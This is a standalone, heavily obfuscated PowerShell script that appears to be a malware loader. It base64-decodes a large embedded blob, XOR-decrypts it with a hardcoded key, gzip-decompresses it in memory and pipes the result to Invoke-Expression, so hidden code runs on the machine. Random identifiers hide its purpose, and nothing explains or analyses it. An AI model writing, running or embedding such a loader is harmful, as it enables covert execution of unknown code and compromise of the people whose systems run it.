$p8ac2lv7fw4txy3 = [System.Text.Encoding]::ascii
function rk07ndsi2bxco68w49h35ztguqj  {param($h4em6fvrkxu18nl )
  $24syzmi59djtlop = [System.Convert]::FromBase64String($h4em6fvrkxu18nl)
  $4uf9dk5j8h7zqmx= $p8ac2lv7fw4txy3.GetBytes("mrqkd08ja4ng")
    $shl94xkdvy5taif = $24syzmi59djtlop
    $bkj1udsoe3qcphi = $(for ($37ozr4mgpawd9sh = 0; $37ozr4mgpawd9sh -lt $shl94xkdvy5taif.length; ) {
        for ($c5rkwviuq2ofe1t = 0; $c5rkwviuq2ofe1t -lt $4uf9dk5j8h7zqmx.length; $c5rkwviuq2ofe1t++) {
            $shl94xkdvy5taif[$37ozr4mgpawd9sh] -bxor $4uf9dk5j8h7zqmx[$c5rkwviuq2ofe1t]
            $37ozr4mgpawd9sh++
            if ($37ozr4mgpawd9sh -ge $shl94xkdvy5taif.Length) {
                $c5rkwviuq2ofe1t = $4uf9dk5j8h7zqmx.length
            }
        }
    })
	$yhxopbjle857z0u = New-Object System.IO.MemoryStream( , $bkj1udsoe3qcphi )

	    $uqb7lpn5vfc21dw = New-Object System.IO.MemoryStream
        $c5rkwviuq2ofe1t3nebwmf8r2ydq0 = New-Object System.IO.Compression.GzipStream $yhxopbjle857z0u, ([IO.Compression.CompressionMode]::Decompress)
	    $c5rkwviuq2ofe1t3nebwmf8r2ydq0.CopyTo( $uqb7lpn5vfc21dw )
        $c5rkwviuq2ofe1t3nebwmf8r2ydq0.Close()
		$yhxopbjle857z0u.Close()
		[byte[]] $65xwzl8bhdeytu0 = $uqb7lpn5vfc21dw.ToArray()
 $9npwudr7c2oxk81=$65xwzl8bhdeytu0
    return $9npwudr7c2oxk81
}
[byte[]]$3bozv0sy8c19nil=rk07ndsi2bxco68w49h35ztguqj $z5dnu4acokb36e1
[System.Text.Encoding]::ascii.GetString((rk07ndsi2bxco68w49h35ztguqj "cvl5a2QwOGplNOMyAAHqU3TORKaRK1p9snbuYOctn8fy/Wm8SPsKGv4n998WWshE7n77ajV54ExYy5lJQjxtt2uxISrK4d2oU8lj0cLzBSUCY195TpvAkuiVZuCxp8BG1WBTIwAEAjf4CSiLxZVMw/QX1zpClkSHM8GFASzSn+su5Ef9sxcjuqyq6N/TqLaCc/mMkIdTGjenmB3Na+vTuaQRy4wfBOVOA5RlGXAGfyzkvyKdfhNXVB5piK6sviJ2xzSURkXfrGrqhZt8nwo47ma/C6vCNf+TEMUDwscHk25Wb+BqdPbMhR7RFdlCce6W9kGv6MowoSKctBpmxRO90mQ5NlWRc7/qkfbd1/o8WKxfdRUxXiYKB8ig/tRrej50gDonyd53Wts7hpoA6r0YMDGYTQHobjiUdN+fvg6N+pX8Gr1dsgkVpbJwXGFfme25unIagD+d75kkh4IOj6EMJkq7FJx5Iy+RKNtUlB793g85SQDtgw9HhDDDlTfYaTySrpwiO/G6wHM141idho9L4cESWcIKe4ujgy+zgz5zqLL6q3SvEZJdLeJRl2UM/+wAwvsroyTGgrGv8ymagIoMWpow25VwJFsIbPM2o3jCDDzJ6S8HkmFMJrmwsJGnuyN0eFhFjW1h6MTZdY2CXDtj5EzChebuQUM9FX6bNFzNaZLaFc3W5zs1JGtmOf2LlBsHvEdMu1FxG9TFEm1iPHNGGqLn55XTJrdJ+/Q9KvgyU3HAscMg+5INEUFQmfNCdnGqlZGj/b13j7fqbTbS7keQ/ppwxWQTsC0mbGsVNYMJ2FZhcohYST6YdWICj58lzbCp2FxlHNkaBZJHqgkp3/ZT+Cx5mzP5FTISqZp6dyVhGsL1ZCqM4fclfVfIfL3HgbeYNUB2bAwsX8dlRbvjEhDz0e679EIIii3yf8p4awxngrjABIhVOrQjnKd+ll9nq/ldjcASw2s9xJhS9PHgzgqt3YnBtZmISL5aVpn+h6+lQxSAy5UKFZHJvGu7SbXWG/O8dgkFQNttwMHeqWmAp2upiJr61TRscomfiE6m3uCfkPpgOS1zvudIaT7nuk0RHgm8ZxLtmOQnCsXhLaypVxNz497EOmCaaHL7Mqk/s60Uhx4MIEGe7+guSFKeRkbYjMfFz3LEC3hyubo2InERE3J2fBCfGmRkEWRttWUPcWXcHekfzjPPH7Fk8PelA5jFAJNlqdX8Kzs3OGo="))|iex;